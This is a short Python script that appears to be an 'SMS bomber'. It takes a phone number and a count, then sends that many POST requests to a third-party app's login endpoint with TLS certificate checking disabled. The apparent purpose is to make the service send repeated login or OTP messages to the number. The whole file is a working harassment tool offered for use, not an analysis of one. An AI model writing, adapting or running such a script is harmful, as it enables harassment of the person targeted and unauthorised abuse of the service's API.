import requests

# Input data
phone = input("Enter phone number: ")
amount = int(input("Enter number of requests to send: "))

# URL and headers
url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web"
headers = {
    "Content-Type": "application/json",
}

# Data payload template
data_template = {
    "number": phone
}

# Function to send a POST request
def send_request():
    try:
        response = requests.post(url, json=data_template, headers=headers, verify=False)  # 'verify=False' disables SSL verification
        response.raise_for_status()  # Check if the request was successful
        print(f"Response: {response.text}")
    except requests.exceptions.HTTPError as errh:
        print("HTTP Error:", errh)
    except requests.exceptions.ConnectionError as errc:
        print("Error Connecting:", errc)
    except requests.exceptions.Timeout as errt:
        print("Timeout Error:", errt)
    except requests.exceptions.RequestException as err:
        print("Something went wrong:", err)

# Loop to send requests multiple times
for i in range(amount):
    print(f"Sending request {i+1} of {amount}...")
    send_request()
